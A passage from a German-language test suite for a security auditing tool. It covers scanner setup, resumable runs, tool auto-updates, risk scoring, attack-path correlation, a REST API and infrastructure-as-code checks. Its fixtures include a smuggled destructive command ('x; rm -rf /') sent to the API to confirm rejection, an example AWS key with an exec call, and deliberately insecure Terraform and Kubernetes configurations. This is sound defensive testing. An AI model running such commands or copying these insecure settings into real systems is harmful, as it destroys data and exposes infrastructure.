    const sess = await setup.startSession({ deps: fs7.deps });
    await sess.stop();
    check('sitzung: startet Greenbone und beendet die Umgebung danach', sess.ok && /up -d/.test(fs7.log[0].input) && /-mmin -1440/.test(fs7.log[0].input) && fs7.released() === 1 && fs7.log[fs7.log.length - 1].args.join(' ') === '--terminate vigil-gvm');
    const fs8 = fakeSetup({ distro: true });
    check('entfernen: betrifft nur die eigene Umgebung', (await setup.removeSetup({ deps: fs8.deps })).ok && fs8.log[fs8.log.length - 1].args.join(' ') === '--unregister vigil-gvm');
    let tries = 0;
    const lateCall = async (x) => { if (/^<get_version/.test(x) && tries++ < 2) throw new Error('noch nicht bereit'); return makeServer().call(x); };
    const late = await gb.status(await (async () => { for (;;) { try { await lateCall('<get_version/>'); return makeServer().call; } catch { /* nochmal */ } } })());
    check('sitzung: spät erreichbarer Scanner wird abgewartet', late.ok && tries === 3);

    // Vorpruefung im eigenen Thread: gleiches Ergebnis wie direkt gerechnet
    {
      const { runPrescan } = require('../src/core/prescan-worker');
      const { prescan } = require('../src/core/prescan');
      const units = [{ label: 'p/a.js', kind: 'file', language: 'javascript', content: 'const k = "AKIAIOSFODNN7EXAMPLE";\nrequire("child_process").exec(x);' }, { label: 'p/package.json', kind: 'file', language: 'json', content: '{"dependencies":{"lodash":"4.17.0"}}' }];
      const seen = [];
      const w = await runPrescan(units, {}, (p) => seen.push(p));
      const direct = prescan(units, {});
      check('vorprüfung im Thread: gleiche Funde wie direkt', w.pre.findings.length === direct.findings.length && direct.findings.length > 0 && w.pre.deps.length === direct.deps.length && w.mods.ran.length > 0 && seen.length > 0);
      // Eigene Regel und deaktivierte Regeln kommen im Thread an
      const custom = await runPrescan([{ label: 'x.txt', kind: 'file', content: 'FIRMA-GEHEIM-12345' }], { customSecrets: [{ name: 'Firma', regex: 'FIRMA-GEHEIM-\\d+', severity: 'high' }] });
      check('vorprüfung im Thread: eigene Regeln gelten', custom.pre.findings.some((f) => /Firma/.test(f.title || '') || /Firma/.test(f.ruleId || '')));
    }

    // Pruefung speichern und fortsetzen
    {
      const nfs = require('fs'); const npath = require('path');
      const dir = nfs.mkdtempSync(npath.join(require('os').tmpdir(), 'vigil-resume-test-'));
      const { createRunState } = require('../src/core/runstate');
      const rs = createRunState({ file: npath.join(dir, 'p.json') });
      const id = '11111111-1111-4111-8111-111111111111';
      const c1 = rs.open({ id, targets: [{ type: 'url', value: 'https://a.example', authorized: true }], providerId: 'ollama' });
      c1.set('nmap:a', { findings: [], notes: ['x'] }); c1.setPaused(true);
      const inf = rs.info();
      check('fortsetzen: Stand überlebt den Neustart, Freigabe-Vermerk wird nicht gespeichert', inf.id === id && inf.paused && inf.steps === 1 && inf.targets[0].authorized === undefined);
      const c2 = createRunState({ file: npath.join(dir, 'p.json') }).open({ id, targets: inf.targets, providerId: 'ollama' }, { resume: true });
      check('fortsetzen: fertige Schritte kommen zurück', c2.get('nmap:a') && c2.get('nmap:a').notes[0] === 'x' && c2.get('fehlt') === undefined && rs.info().paused === false);
      const c3 = rs.open({ id: '22222222-2222-4222-8222-222222222222', targets: [], providerId: null });
      check('fortsetzen: neuer Lauf übernimmt keinen fremden Stand', c3.get('nmap:a') === undefined);
      c3.clear();
      check('fortsetzen: nach Ende ist der Stand weg', rs.info() === null);

      // Echter Durchlauf: Beim zweiten Mal laeuft kein gespeicherter Schritt und kein KI-Block noch einmal
      const http = require('http');
      const { analyze } = require('../src/core/analyze');
      let calls = 0;
      const srv = http.createServer((req, res) => { let b = ''; req.on('data', (d) => { b += d; }); req.on('end', () => { calls++; res.setHeader('Content-Type', 'application/json'); res.end(JSON.stringify({ message: { content: JSON.stringify({ findings: [{ title: 'SQL-Injection in getUser', severity: 'high', category: 'Injection', location: 'p/a.js:1', description: 'x', recommendation: 'y', confidence: 0.9, evidence: 'q' }] }) }, prompt_eval_count: 10, eval_count: 2 })); }); });
      await new Promise((r) => srv.listen(0, '127.0.0.1', r));
      const mem = {}; const stepCache = { get: (k) => mem[k], set: (k, v) => { mem[k] = JSON.parse(JSON.stringify(v)); } };
      const cfgR = { provider: 'ollama', model: 'big', baseUrl: `http://127.0.0.1:${srv.address().port}`, analysisDepth: 'thorough', aiValidation: false, incremental: false, stepCache };
      const unitsR = [{ label: 'p/a.js', kind: 'file', language: 'javascript', content: 'db.query("x" + y);' }];
      const a1 = await analyze({ units: unitsR, config: cfgR });
      const n1 = calls;
      // Stand wie nach einer Pause mitten in der Analyse: ein Block fehlt noch
      const lastKey = Object.keys(mem).filter((k) => k.startsWith('ai:')).pop(); delete mem[lastKey];
      const a2 = await analyze({ units: unitsR, config: cfgR });
      check('fortsetzen: nur der fehlende KI-Block läuft neu', n1 >= 2 && calls === n1 + 1 && a2.findings.length === a1.findings.length);
      srv.close();
      const pdir = npath.join(dir, 'proj'); nfs.mkdirSync(pdir); nfs.writeFileSync(npath.join(pdir, 'a.txt'), 'hallo');
      const { runAudit: runA } = require('../src/core');
      const memA = {}; const seen = [];
      const cacheA = { get: (k) => memA[k], set: (k, v) => { memA[k] = JSON.parse(JSON.stringify(v)); seen.push(k); } };
      const base = { provider: 'ollama', model: 'x', baseUrl: 'http://127.0.0.1:9', cveLookup: false, ocr: false, malwareScan: false, stepCache: cacheA };
      await runA([{ type: 'path', value: pdir }], base, () => {}).catch(() => {});
      const first = seen.length; const msgs = [];
      await runA([{ type: 'path', value: pdir }], base, (p) => msgs.push(p.message)).catch(() => {});
      check('fortsetzen: fertige Schritte der Pipeline laufen nicht noch einmal', first >= 1 && seen.length === first && msgs.some((m) => /^Schon erledigt/.test(m)));
      nfs.rmSync(dir, { recursive: true, force: true });
    }

    // Automatische Updates der Werkzeuge
    {
      const up = require('../src/core/toolupdate');
      const crypto = require('crypto'); const nfs = require('fs'); const npath = require('path');
      check('updates: Versionen vergleichen', up.isNewer('3.11.2', '3.11.1') && !up.isNewer('3.11.1', '3.11.1') && up.isNewer('7.993', '7.80') && up.versionIn('[INF] Nuclei Engine Version: v3.11.1') === '3.11.1');
      const h = 'a'.repeat(64);
      check('updates: Prüfsumme in beiden Formaten, nur für genau diese Datei', up.checksumFor(`${h}  tool.zip\n${'b'.repeat(64)}  other.zip`, 'tool.zip') === h && up.checksumFor(`${h} *dist/tool.exe`, 'tool.exe') === h && up.checksumFor(`tool.exe ${h}`, 'tool.exe') === h && up.checksumFor(`${h}  andere.zip`, 'tool.zip') === null);
      check('updates: Digest-Format von nmap', up.nmapDigest('x:\nSHA256 = 22E5928D 1738A1B9 4FFD3643 014F52CB 87D467DB EC4CFF9E 5F721FE0 B3782F1B\nx:\nSHA384 = E2863D7C') === '22e5928d1738a1b94ffd3643014f52cb87d467dbec4cff9e5f721fe0b3782f1b' && up.nmapDigest('nichts') === null);
      const dir = nfs.mkdtempSync(npath.join(require('os').tmpdir(), 'vigil-up-test-'));
      const exe = npath.join(dir, 'tool.exe');
      const tool = { id: 'tool', repo: 'x/tool', asset: /^tool\.exe$/, sums: /sums$/, versionArgs: ['--version'] };
      const body = Buffer.from('NEUE-DATEI');
      const sum = crypto.createHash('sha256').update(body).digest('hex');
      const ok = (o) => ({ ok: true, status: 200, json: async () => o, text: async () => o, arrayBuffer: async () => body });
      const fetchFake = (o = {}) => async (url) => {
        if (/releases\/latest/.test(url)) return ok({ tag_name: o.tag || 'v2.0.0', assets: [{ name: 'tool.exe', browser_download_url: 'https://x/tool.exe' }, { name: 'sums', browser_download_url: 'https://x/sums' }] });
        if (/sums$/.test(url)) return ok(`${o.badSum ? 'c'.repeat(64) : sum}  tool.exe`);
        return ok('');
      };
      // Version aus dem Dateiinhalt: alte Datei meldet 1.0.0, neue 2.0.0 oder laeuft gar nicht
      const runFake = (o = {}) => async (cmd) => { const now = nfs.readFileSync(cmd, 'utf8'); if (now === 'NEUE-DATEI' && o.blocked) return { ok: false, code: 1, stdout: '', stderr: 'blockiert' }; return { ok: true, code: 0, stdout: now === 'NEUE-DATEI' ? 'tool 2.0.0' : 'tool 1.0.0', stderr: '' }; };
      nfs.writeFileSync(exe, 'ALTE-DATEI');
      const cur = await up.updateGithubTool(tool, exe, { run: runFake(), fetchImpl: fetchFake({ tag: 'v1.0.0' }) });
      check('updates: aktuelle Version bleibt unangetastet', cur.status === 'current' && nfs.readFileSync(exe, 'utf8') === 'ALTE-DATEI');
      const badSum = await up.updateGithubTool(tool, exe, { run: runFake(), fetchImpl: fetchFake({ badSum: true }) });
      check('updates: falsche Prüfsumme tauscht nichts aus', badSum.status === 'failed' && /Prüfsumme/.test(badSum.error) && nfs.readFileSync(exe, 'utf8') === 'ALTE-DATEI');
      const blocked = await up.updateGithubTool(tool, exe, { run: runFake({ blocked: true }), fetchImpl: fetchFake() });
      check('updates: läuft die neue Datei nicht, kommt die alte zurück', blocked.status === 'rolled-back' && nfs.readFileSync(exe, 'utf8') === 'ALTE-DATEI' && !nfs.existsSync(exe + '.bak'));
      const good = await up.updateGithubTool(tool, exe, { run: runFake(), fetchImpl: fetchFake() });
      check('updates: neue Version wird eingesetzt und geprüft', good.status === 'updated' && good.from === '1.0.0' && good.to === '2.0.0' && nfs.readFileSync(exe, 'utf8') === 'NEUE-DATEI' && !nfs.existsSync(exe + '.bak'));
      check('updates: fehlendes Werkzeug wird nicht installiert', (await up.updateGithubTool(tool, npath.join(dir, 'gibt-es-nicht.exe'), { run: runFake(), fetchImpl: fetchFake() })).status === 'missing');
      // nmap: Windows-Abfrage abgelehnt -> eine Woche Ruhe; ungueltige Signatur -> kein Start
      const nmapBody = Buffer.from('SETUP'); const nsum = crypto.createHash('sha256').update(nmapBody).digest('hex').toUpperCase().match(/.{8}/g).join(' ');
      const nf = async (url) => (/download\.html/.test(url) ? { ok: true, text: async () => 'nmap-7.993-setup.exe' } : /digest/.test(url) ? { ok: true, text: async () => `SHA256 = ${nsum}` } : { ok: true, arrayBuffer: async () => nmapBody });
      const ncalls = [];
      const nrun = (sigOk, installOk) => async (cmd, args) => { ncalls.push(args.join(' ')); if (cmd === 'powershell' && /Get-Authenticode/.test(args.join(' '))) return { ok: true, stdout: sigOk ? 'Valid\nCN=Insecure.Com LLC' : 'NotSigned\n' }; if (cmd === 'powershell') return { ok: installOk, stdout: '' }; return { ok: true, stdout: 'Nmap version 7.80 ( https://nmap.org )' }; };
      const nSig = await up.updateNmap('nmap', { run: nrun(false, true), fetchImpl: nf });
      check('updates: nmap ohne gültige Signatur startet nicht', nSig.status === 'failed' && /Signatur/.test(nSig.error) && !ncalls.some((c) => /RunAs/.test(c)));
      const nRefused = await up.updateNmap('nmap', { run: nrun(true, false), fetchImpl: nf });
      check('updates: abgelehnte Windows-Abfrage wird gemerkt', nRefused.status === 'failed' && nRefused.attempted === true && ncalls.some((c) => /RunAs/.test(c)));
      const nWait = await up.updateNmap('nmap', { run: nrun(true, true), fetchImpl: nf, lastAttempt: Date.now() - 1000 });
      check('updates: danach eine Woche keine neue Abfrage', nWait.status === 'waiting');
      // Vigil selbst: nur vorspulen, nie ueber eigene Aenderungen
      const gitRun = (o) => async (cmd, args) => { const a = args.slice(2).join(' '); if (/rev-parse --abbrev/.test(a)) return { ok: true, stdout: o.branch || 'main' }; if (/status/.test(a)) return { ok: true, stdout: o.dirty ? ' M x' : '' }; if (/rev-parse HEAD/.test(a)) { o.n = (o.n || 0) + 1; return { ok: true, stdout: o.n > 1 && o.moved ? 'bbbbbbbbb' : 'aaaaaaaaa' }; } if (/merge/.test(a)) return { ok: !o.ahead, stdout: '' }; return { ok: true, stdout: '' }; };
      nfs.mkdirSync(npath.join(dir, '.git'));
      check('updates: Vigil nur ohne eigene Änderungen und nur auf main', (await up.updateSelf(dir, { run: gitRun({ dirty: true }) })).status === 'skipped' && (await up.updateSelf(dir, { run: gitRun({ branch: 'dev' }) })).status === 'skipped' && (await up.updateSelf(dir, { run: gitRun({ ahead: true }) })).status === 'skipped');
      const selfUp = await up.updateSelf(dir, { run: gitRun({ moved: true }) });
      check('updates: neue Vigil-Version wird beim nächsten Start aktiv', selfUp.status === 'updated' && selfUp.restart === true);
      check('updates: installierte Fassung ohne Git bleibt unberührt', (await up.updateSelf(npath.join(dir, 'tool.exe.x'), { run: gitRun({}) })).status === 'skipped');
      let locked = 0;
      const lockErr = () => Object.assign(new Error('gesperrt'), { code: 'EBUSY' });
      check('updates: kurze Dateisperre wird abgewartet', (await up.withRetry(() => { if (++locked < 3) throw lockErr(); return 'ok'; }, { delayMs: 1 })) === 'ok' && locked === 3);
      let otherThrown = false;
      try { await up.withRetry(() => { throw new Error('anders'); }, { delayMs: 1 }); } catch { otherThrown = true; }
      check('updates: andere Fehler werden nicht wiederholt', otherThrown);
      nfs.rmSync(exe, { force: true }); nfs.writeFileSync(exe + '.bak', 'ALTE-DATEI');
      const rec = await up.updateGithubTool(tool, exe, { run: runFake(), fetchImpl: fetchFake({ tag: 'v1.0.0' }) });
      check('updates: abgebrochener Austausch wird beim nächsten Lauf repariert', rec.status === 'current' && nfs.readFileSync(exe, 'utf8') === 'ALTE-DATEI');
      const rp = npath.join(dir, 'retire.json');
      nfs.writeFileSync(rp, '{"version":"5.0.0"}');
      const rl = await up.updatePackaged({ retirePkg: rp, run: async (cmd) => { if (/retire@latest/.test(cmd)) { nfs.writeFileSync(rp, '{"version":"5.1.0"}'); return { ok: true }; } return { ok: false }; } });
      check('updates: installiertes retire.js wird aktualisiert', rl[0].id === 'retire.js' && rl[0].status === 'updated' && rl[0].to === '5.1.0');
      let npmCalled = false;
      await up.updatePackaged({ retirePkg: npath.join(dir, 'fehlt.json'), run: async (cmd) => { if (/retire/.test(cmd)) npmCalled = true; return { ok: false }; } });
      check('updates: fehlendes retire.js wird nicht installiert', !npmCalled);
      const stF = npath.join(dir, 'st.json');
      const first = await up.runAll({ stateFile: stF, paths: {}, run: async () => ({ ok: false }), fetchImpl: fetchFake(), now: 1e12 });
      const again = await up.runAll({ stateFile: stF, paths: {}, run: async () => ({ ok: false }), fetchImpl: fetchFake(), now: 1e12 + 1000 });
      check('updates: höchstens einmal am Tag', !first.skipped && again.skipped === true);
      nfs.rmSync(dir, { recursive: true, force: true });
      const gs = require('../src/core/greenbone-setup');
      check('greenbone: Tests täglich, System und Greenbone wöchentlich, Fehler stoppen den Scan nicht', /-mmin -10080/.test(gs.START_SH) && /apt-get upgrade/.test(gs.START_SH) && /-mmin -1440/.test(gs.START_SH) && /\|\| true/.test(gs.START_SH));
    }

    // Englisch
    const T = require('../src/core/findings-i18n');
    check('englisch: neue Befundtexte übersetzt', /^openssl 1\.1: 2 known vulnerability/.test(T.translate('openssl 1.1: 2 bekannte Lücke(n) mit verfügbarem Update (h)')) && /^Greenbone: 3 finding/.test(T.translate('Greenbone: 3 Befund(e) auf a.b.')) && /^Operating system without/.test(T.translate('Betriebssystem ohne Sicherheitsupdates: Ubuntu 18 (h)')));
  }

  console.log('Threat-Intel, Risiko, Angriffspfade:');
  {
    const { applyIntel, contextualRisk, correlate } = require('../src/core/intel');
    const { normalizeFinding: nf } = require('../src/core/schema');
    const intel = { kev: new Set(['CVE-2021-44228']), epss: new Map([['CVE-2021-44228', [0.97, 0.999]], ['CVE-2020-8203', [0.02, 0.8]]]) };
    const [log4j, lodash] = applyIntel([nf({ title: 'log4j (CVE-2021-44228)', severity: 'critical', cvss: 10, category: 'Dependencies' }, 'osv'), nf({ title: 'lodash (CVE-2020-8203)', severity: 'high', cvss: 7.4, category: 'Dependencies' }, 'osv')], intel);
    check('intel: KEV + EPSS übernommen', log4j.inCisaKev && log4j.epssScore === 0.97 && !lodash.inCisaKev);
    {
      const f = require('path').join(require('os').tmpdir(), `vigil-intel-${process.pid}.json`);
      require('fs').writeFileSync(f, JSON.stringify({ updatedAt: '2026-11-05T00:00:00.000Z', counts: { kev: 2, epss: 3 }, kev: ['a', 'b'], epss: { x: [0, 0] } }));
      const meta = require('../src/core/intel').readIntelMeta(f);
      require('fs').writeFileSync(f, JSON.stringify({ updatedAt: '2026-11-05T00:00:00.000Z', kev: [], epss: {} }));
      const oldMeta = require('../src/core/intel').readIntelMeta(f);
      require('fs').unlinkSync(f);
      check('intel: Stand und Anzahl ohne die vollen Listen, alte Datei gilt als veraltet', meta.updatedAt === '2026-11-05T00:00:00.000Z' && meta.kev.size === 2 && meta.epss.size === 3 && oldMeta.updatedAt === null && require('../src/core/intel').readIntelMeta('gibt-es-nicht').updatedAt === null);
    }
    check('risk: KEV mind. 95', contextualRisk(log4j) === 100 && contextualRisk({ ...lodash, cvss: 3, inCisaKev: true }) === 95);
    check('risk: intern x0.75, Testcode x0.4', contextualRisk(lodash, { internetExposed: false }) === 55.5 && contextualRisk({ ...lodash, devOnly: true }) === 29.6);
    const T = (ruleId, extra = {}) => nf({ ruleId, title: ruleId, severity: 'high', category: 'Config', location: 'x:' + ruleId.length, ...extra }, 'container-host-audit');
    const chains = correlate([T('container-root-user'), T('container-docker-sock'), T('sast-ssrf', { category: 'SSRF' }), T('container-db-port-public')]);
    check('correlate: Container-Ausbruch erkannt (100)', chains.some((c) => c.ruleId === 'toxic-container-escape' && c.contextualRiskScore === 100 && c.linkedKeys.length >= 3));
    check('correlate: DB-Kette ohne Firewall-Befund nicht', !chains.some((c) => c.ruleId === 'toxic-db-breach'));

    // Sitzungsübernahme: nur mit echtem Anmelde-Cookie, ohne echte XSS-Lücke nur "möglich"
    const W = (ruleId, title, extra = {}) => nf({ ruleId, title, severity: 'medium', category: 'Config', location: 'https://shop.example/', ...extra }, 'webscan');
    const csp = W('missing-csp-header', 'Kein Schutz gegen eingeschleuste Skripte (Content-Security-Policy fehlt)');
    const tracking = correlate([csp, W('cookie-missing-httponly-_ga', 'Cookie „_ga“ ist für Skripte lesbar')]);
    check('correlate: Tracking-Cookie ergibt keinen Angriffsweg', !tracking.some((c) => c.ruleId === 'toxic-session-hijack'));
    const [possible] = correlate([csp, W('cookie-missing-httponly-phpsessid', 'Cookie „PHPSESSID“ ist für Skripte lesbar')]);
    check('correlate: ohne XSS-Lücke nur "möglich" und abgeschwächt', possible && /^Möglicher Angriffsweg/.test(possible.title) && possible.severity === 'medium' && possible.contextualRiskScore < 70);
    const pc = possible.chain;
    check('correlate: Ablauf mit Start, Schritten, Ziel; unbewiesener Einstieg markiert, einfachste Unterbrechung', pc && pc.entry && pc.goal && pc.steps.length === 2 && pc.steps[0].stage === 'Fremder Code läuft in der Seite' && !pc.steps[0].proven && pc.steps[1].proven && pc.steps[1].easiest && !pc.steps[0].easiest && pc.steps[1].keys[0] === 'cookie-missing-httponly-phpsessid@https://shop.example/');
    const esc = chains.find((c) => c.ruleId === 'toxic-container-escape').chain;
    check('correlate: Container-Weg beginnt mit dem Einstieg von außen', esc.steps[0].stage === 'Einstieg in die Anwendung' && esc.steps.length === 3);
    check('correlate: Ablauf wird übersetzt', require('../src/core/findings-i18n').localizeFinding(possible).chain.steps[1].stage === 'Reading the login');
    check('correlate: nennt das konkrete Cookie und den Host', /PHPSESSID/.test(possible.description) && /shop\.example/.test(possible.description));
    const [real] = correlate([csp, W('xss-reflected', 'Reflektiertes XSS im Suchfeld', { category: 'XSS' }), W('cookie-missing-httponly-session', 'Cookie „session“ ist für Skripte lesbar')]);
    check('correlate: mit echter XSS-Lücke bestätigt', real && /^Angriffsweg/.test(real.title) && real.severity === 'high');
    check('correlate: Schritte konkret, leichtester zuerst', real.steps.length === 2 && /^Am schnellsten: .*HttpOnly/.test(real.steps[0]) && real.steps.every((s) => /Befund: „/.test(s)));

    // Verständliche Sprache: keine Zählmarken, kein Jargon, keine Ersatz-Umlaute, keine Verweise ins Leere
    const { KB } = require('../src/core/remedies');
    const BAD = [/\(\d+×\)/, /\bSenke\b/, /\bGlied\b/, /\bunten\b/, /\b(ueber|fuer|koenn|moeglich|Schluessel|Aenderung|unnoetig|verschluessel|gueltig|eingeschraenkt|laeuft)/i];
    const texts = [
      ...[possible, real, ...chains].flatMap((c) => [c.title, c.description, c.impact, c.explanation, ...(c.steps || [])]),
      ...KB.flatMap((k) => [k.explanation, ...(k.steps || [])]),
    ].filter(Boolean);
    const offenders = texts.filter((t) => BAD.some((re) => re.test(t)));
    check('sprache: Angriffswege und Wissensbasis ohne Jargon/Zählmarken', offenders.length === 0);
    if (offenders.length) console.log('    ' + offenders.slice(0, 5).join('\n    '));
    const webSrc = require('fs').readFileSync(require('path').join(__dirname, '../src/core/webscan.js'), 'utf8');
    const webTexts = [...webSrc.matchAll(/(?:title|description|impact|remediation): [`'"]([^`'"]+)/g)].map((m) => m[1]);
    const webBad = webTexts.filter((t) => BAD[4].test(t));
    check('sprache: Web-Check-Texte mit echten Umlauten', webBad.length === 0);
    if (webBad.length) console.log('    ' + webBad.slice(0, 5).join('\n    '));
  }

  console.log('Baseline, SBOM, Verifizierung, Backoff:');
  {
    const store = require('../src/core/store');
    const { normalizeFinding: nf } = require('../src/core/schema');
    const db = store.emptyStore();
    const tgt = [{ type: 'path', value: 'C:\\shop' }];
    const ran = [{ target: 'C:\\shop', source: 'prescan' }];
    const A = nf({ ruleId: 'a', title: 'A', location: 'shop/a.js:1', severity: 'high', category: 'Secrets' }, 'prescan');
    const B = nf({ ruleId: 'b', title: 'B', location: 'shop/b.js:1', severity: 'low', category: 'Secrets' }, 'prescan');
    const r1 = store.applyRun(db, { targets: tgt, findings: [A], scannersRun: ran, sbom: [{ ecosystem: 'npm', name: 'lodash', version: '4.17.15' }] });
    const bl = store.setBaseline(db, r1.targetIds[0]);
    store.applyRun(db, { targets: tgt, findings: [A, B], scannersRun: ran });
    check('baseline: Altlast markiert, Neues nicht', bl.count === 1 && store.listFindings(db, { newSinceBaseline: true }).map((f) => f.ruleId).join() === 'b');
    check('sbom: Paket + Version gefunden', store.searchSbom(db, 'lodash@4.17').length === 1 && store.searchSbom(db, 'lodash@5').length === 0);
    check('store: Ziel hat Verifizierungs-Token', /^[a-f0-9]{24}$/.test(db.targets[r1.targetIds[0]].verificationToken));
    check('stats: Sicherheitswert berechnet', typeof store.stats(db).posture === 'number');

    const { verifyOwnership } = require('../src/core/scope');
    const okDns = await verifyOwnership({ type: 'url', value: 'https://shop.example.com' }, 'tok123', { resolveTxt: async (n) => (n === '_sec-audit-verify.example.com' ? [['tok123']] : []), fetchImpl: async () => ({ ok: false }) });
    const bad = await verifyOwnership({ type: 'url', value: 'https://shop.example.com' }, 'tok123', { resolveTxt: async () => [['falsch']], fetchImpl: async () => ({ ok: true, text: async () => 'anderes' }) });
    const wk = await verifyOwnership({ type: 'url', value: 'https://x.example' }, 'tok9', { resolveTxt: async () => { throw new Error('nx'); }, fetchImpl: async () => ({ ok: true, text: async () => 'tok9\n' }) });
    check('verify: DNS-TXT, .well-known, Ablehnung', okDns.ok && okDns.method === 'dns' && wk.ok && wk.method === 'well-known' && !bad.ok);
    check('verify: interne Adresse ohne Nachweis', (await verifyOwnership({ type: 'endpoint', value: '192.168.1.4' }, 'x')).ok);

    const { WafGuard } = require('../src/core/modules/web');
    const g = new WafGuard(1000);
    let threw = false;
    try { g.after('h', 429); g.after('h', 200); g.after('h', 503); g.after('h', 403); g.after('h', 429); } catch (e) { threw = e.throttled; }
    check('backoff: erst bei 3 Sperren in Folge', threw === true);

    const report = require('../src/core/report');
    const j = JSON.parse(report.toJson({ summary: { total: 1, counts: {} }, findings: [{ ...A, contextualRiskScore: 80 }], meta: {} }, { posture: 70, open: {}, toxic: [], kev: 0, newSinceBaseline: 1 }));
    check('report: JSON mit Sicherheitswert', j.posture.score === 70 && j.findings[0].contextualRiskScore === 80);
  }

  console.log('REST-API:');
  {
    const os = require('os'); const path = require('path'); const fs = require('fs');
    const { createOrchestrator } = require('../electron/orchestrator');
    const { createApi } = require('../electron/api');
    const { enforceScope } = require('../src/core/scope');
    const file = path.join(os.tmpdir(), `vigil-test-store-${process.pid}.json`);
    const fakeAudit = async (targets) => ({ result: { findings: [normalizeTestFinding()], summary: { total: 1, counts: { medium: 1 } }, errors: [], meta: { scannersRun: targets.map((t) => ({ target: t.value, source: 'webscan' })) } } });
    function normalizeTestFinding() { return require('../src/core/schema').normalizeFinding({ ruleId: 'missing-csp-header', title: 'CSP fehlt', severity: 'medium', category: 'Config', location: 'https://ok.example/' }, 'webscan'); }
    const orch = createOrchestrator({ storeFile: file, runAudit: fakeAudit, buildConfig: () => ({}) });
    const cfg = { apiToken: 'test-token-123', allowlist: ['ok.example'], selected: 'ollama' };
    const api = createApi({ orchestrator: orch, getConfig: () => cfg, enforceScope });
    // Port 0: das System vergibt direkt einen freien Port (kein Wettlauf zwischen Suchen und Belegen)
    const started = await api.start(0); const freePort = started.port;
    check('api: startet auf 127.0.0.1', started.ok && freePort > 0);
    const url = (p) => `http://127.0.0.1:${freePort}${p}`;
    const H = { Authorization: 'Bearer test-token-123', 'Content-Type': 'application/json' };
    check('api: ohne Token 401', (await fetch(url('/api/stats'))).status === 401);
    check('api: falsches Token 401', (await fetch(url('/api/stats'), { headers: { Authorization: 'Bearer nope' } })).status === 401);
    const bad = await fetch(url('/api/scans'), { method: 'POST', headers: H, body: JSON.stringify({ targets: [{ type: 'url', value: 'https://evil.example' }] }) });
    check('api: Ziel ausserhalb der Freigabe 403', bad.status === 403);
    const inv = await fetch(url('/api/scans'), { method: 'POST', headers: H, body: JSON.stringify({ targets: [{ type: 'image', value: 'x; rm -rf /' }] }) });
    check('api: ungueltige Eingabe 400', inv.status === 400);
    const ok = await fetch(url('/api/scans'), { method: 'POST', headers: H, body: JSON.stringify({ targets: [{ type: 'url', value: 'https://ok.example/' }] }) });
    const { scanId } = await ok.json();
    check('api: Scan angenommen 202', ok.status === 202 && !!scanId);
    for (let i = 0; i < 50 && orch.getRun(scanId).status !== 'COMPLETED'; i++) await new Promise((r) => setTimeout(r, 20));
    check('api: Lauf COMPLETED', (await (await fetch(url('/api/scans/' + scanId), { headers: H })).json()).status === 'COMPLETED');
    const list = await (await fetch(url('/api/findings?status=OPEN'), { headers: H })).json();
    check('api: Befund gespeichert', list.findings.length === 1 && list.findings[0].ruleId === 'missing-csp-header');
    const patch = await fetch(url(`/api/findings/${list.findings[0].id}/status`), { method: 'PATCH', headers: H, body: JSON.stringify({ status: 'ACCEPTED_RISK' }) });
    check('api: Status aendern', patch.status === 200 && (await patch.json()).finding.status === 'ACCEPTED_RISK');
    check('api: Browser-Origin abgewiesen', (await fetch(url('/api/stats'), { headers: { ...H, Origin: 'https://evil.example' } })).status === 403);
    await api.stop();
    try { fs.unlinkSync(file); } catch { /* egal */ }
  }

  // --- Dauer-Schaetzung lernt aus echten Laeufen ---
  {
    const t = require('../src/core/timing');
    const cfg = { provider: 'ollama', model: 'm', aiValidation: true };
    const inp = { targets: [{ type: 'path' }], files: 40, deps: 10, calls: 2, local: true, config: cfg };
    const before = t.estimate(inp, {});
    check('timing: ohne Messung vorsichtig (>= 2 Min. fuer 2 lokale Aufrufe)', before.seconds >= 120 && !before.measured);
    let now = 0; const clk = new t.PhaseClock(() => now);
    clk.tick({ phase: 'prescan' }); now += 5000;
    clk.tick({ phase: 'analyze', total: 2, done: 0 }); now += 150000; clk.tick({ phase: 'analyze', total: 2, done: 1 }); now += 150000; clk.tick({ phase: 'analyze', total: 2, done: 2 });
    clk.tick({ phase: 'validate', total: 1, done: 0 }); now += 45000; clk.tick({ phase: 'validate', total: 1, done: 1 });
    const m = clk.finish();
    check('timing: Phasen gemessen', Math.round(m.total) === 350 && m.aiCalls === 2 && m.validateCalls === 1);
    const after = t.estimate(inp, t.learn({}, m, { ...inp }));
    check('timing: nach einem 6-Min-Lauf schaetzt Vigil ~6 Min.', after.measured && Math.abs(after.seconds - 350) < 40);
    const web = t.estimate({ targets: [{ type: 'url' }], config: {} }, {});
    check('timing: Webadresse ohne KI nicht unter einer Minute', web.seconds >= 60);
  }

  // --- Server-Einrichtung als Code, Lizenzen, weitere Sprachen, Git-Historie ---
  {
    const { runIac } = require('../src/core/modules/iac');
    const { runLicense, conflict } = require('../src/core/modules/license');
    const { runLangs } = require('../src/core/modules/langs');
    const { scanLog } = require('../src/core/githistory');
    const U = (label, content) => ({ label, content, kind: 'file' });
    const tf = U('infra/main.tf', 'resource "aws_s3_bucket" "logs" {\n  bucket = "x"\n  acl    = "public-read"\n}\nresource "aws_security_group" "web" {\n  ingress {\n    from_port   = 22\n    to_port     = 22\n    cidr_blocks = ["0.0.0.0/0"]\n  }\n}\nresource "aws_db_instance" "db" {\n  publicly_accessible = true\n  password = "SuperGeheim123"\n}\n');
    const ids = runIac([tf]).map((f) => f.ruleId);
    check('iac: Terraform – offener Bucket, SSH offen, DB öffentlich, Passwort', ['iac-s3-public-acl', 'iac-sg-open-admin', 'iac-db-public', 'iac-db-unencrypted', 'iac-hardcoded-secret'].every((x) => ids.includes(x)));
    check('iac: Zeile stimmt', runIac([tf]).find((f) => f.ruleId === 'iac-s3-public-acl').location === 'infra/main.tf:3');
    const k8s = U('k8s/app.yaml', 'apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: shop\nspec:\n  template:\n    spec:\n      hostNetwork: true\n      containers:\n        - name: shop\n          image: shop:latest\n          securityContext:\n            privileged: true\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: shop\n');
    const kid = runIac([k8s]).map((f) => f.ruleId);
    check('iac: Kubernetes – privileged, hostNetwork, latest, keine Limits', ['k8s-privileged', 'k8s-hostnetwork', 'k8s-image-latest', 'k8s-no-limits'].every((x) => kid.includes(x)));
    const safe = U('k8s/ok.yaml', 'apiVersion: v1\nkind: Pod\nmetadata:\n  name: ok\nspec:\n  securityContext:\n    runAsNonRoot: true\n  containers:\n    - name: a\n      image: nginx:1.27.2\n      resources:\n        limits:\n          cpu: 100m\n');
    check('iac: sauberes Pod-Manifest ohne Befund', runIac([safe]).length === 0);
